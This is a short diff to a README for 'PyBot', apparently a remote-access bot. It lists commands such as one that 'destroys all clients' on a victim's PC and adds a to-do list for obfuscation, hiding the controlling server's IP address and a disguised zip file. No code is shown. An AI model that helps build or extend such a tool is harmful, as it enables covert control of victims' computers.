@@ -62,7 +62,7 @@ https://github.com/DABOSS2016YT/PyBot/blob/4726790373c0c146fae0b39cf975cabd7645f
 
 
 
---------------------- **_Commands_** ---------------------
+# --------------------- **_Commands_** ---------------------
 
 **list - lists all the commands**
 
@@ -81,5 +81,11 @@ https://github.com/DABOSS2016YT/PyBot/blob/4726790373c0c146fae0b39cf975cabd7645f
 **destroy - destroys all clients (until the victim restarts their PC)**
 
 **help - shows commands**
+
+
+# TO DO
+- add deobfuscation for other devices
+- attempt to find a better way the client can mask the server's IP address
+- find a bigger slice of pizza to put in a.slice.of.pizza.zip
 
 
